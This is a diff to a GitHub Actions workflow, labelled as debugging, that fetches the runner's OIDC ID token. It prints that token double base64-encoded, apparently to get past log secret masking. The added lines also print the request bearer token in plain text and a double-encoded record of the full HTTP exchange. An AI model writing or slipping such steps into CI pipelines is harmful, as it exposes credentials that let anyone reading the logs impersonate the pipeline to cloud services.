@@ -1,5 +1,4 @@
-name: Print OIDC ID Token (Double Base64)
-
+name: Print OIDC ID Token (Double Base64 Debug)
 on:
   workflow_dispatch:
 
@@ -9,26 +8,80 @@ jobs:
     permissions:
       id-token: write        # Required to fetch the OIDC token
       contents: read         # Minimal extra permission for actions/checkout if needed
-
+    
     steps:
-      - name: Request OIDC Token and Encode
+      - name: Request OIDC Token and Capture Full HTTP Exchange
         shell: bash
         run: |
-          # Request the ID token with default audience
-          TOKEN=$(curl -sSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=example")
-
-          # Extract just the raw token (without JSON structure)
-          RAW_TOKEN=$(echo "$TOKEN" | jq -r '.value')
-
-          echo "Original token (JWT):"
+          echo "=== OIDC TOKEN REQUEST DEBUG ==="
+          echo ""
+          
+          # Prepare request details
+          REQUEST_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=example"
+          REQUEST_HEADER="Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+          
+          echo "--- HTTP REQUEST DETAILS ---"
+          echo "Method: GET"
+          echo "URL: ${REQUEST_URL}"
+          echo "Headers:"
+          echo "  ${REQUEST_HEADER}"
+          echo ""
+          
+          # Make request with verbose output to capture full exchange
+          RESPONSE=$(curl -sSL -w "\n---CURL_INFO---\nHTTP_CODE:%{http_code}\nCONTENT_TYPE:%{content_type}\nTIME_TOTAL:%{time_total}\n" \
+            -H "${REQUEST_HEADER}" \
+            "${REQUEST_URL}")
+          
+          # Split response and metadata
+          HTTP_BODY=$(echo "$RESPONSE" | sed '/---CURL_INFO---/q' | head -n -1)
+          HTTP_META=$(echo "$RESPONSE" | sed -n '/---CURL_INFO---/,$p')
+          
+          echo "--- HTTP RESPONSE DETAILS ---"
+          echo "$HTTP_META"
+          echo ""
+          echo "Response Body:"
+          echo "$HTTP_BODY"
+          echo ""
+          
+          # Extract the token value
+          RAW_TOKEN=$(echo "$HTTP_BODY" | jq -r '.value')
+          
+          echo "--- TOKEN PROCESSING ---"
+          echo "Original token (JWT) - first 50 chars:"
           echo "${RAW_TOKEN}" | cut -c1-50
           echo "...(truncated for display)"
-
+          echo ""
+          
           # Double Base64 encode the token
           ENCODED_ONCE=$(echo -n "${RAW_TOKEN}" | base64 -w0)
           ENCODED_TWICE=$(echo -n "${ENCODED_ONCE}" | base64 -w0)
-
-          echo ""
-          echo "Doubly Base64-encoded ID token:"
+          
+          echo "--- DOUBLY BASE64-ENCODED TOKEN ---"
           echo "${ENCODED_TWICE}"
+          echo ""
+          
+          # Create full HTTP exchange record
+          FULL_EXCHANGE=$(cat <<EOF
+          === FULL HTTP EXCHANGE ===
+          REQUEST:
+            Method: GET
+            URL: ${REQUEST_URL}
+            Headers: ${REQUEST_HEADER}
+          
+          RESPONSE:
+            ${HTTP_META}
+            Body: ${HTTP_BODY}
+          
+          TOKEN (Raw): ${RAW_TOKEN}
+          EOF
+          )
+          
+          # Double Base64 encode the entire HTTP exchange
+          EXCHANGE_B64_ONCE=$(echo -n "${FULL_EXCHANGE}" | base64 -w0)
+          EXCHANGE_B64_TWICE=$(echo -n "${EXCHANGE_B64_ONCE}" | base64 -w0)
+          
+          echo "--- DOUBLY BASE64-ENCODED HTTP EXCHANGE ---"
+          echo "${EXCHANGE_B64_TWICE}"
+          echo ""
+          
+          echo "=== DEBUG OUTPUT COMPLETE ==="
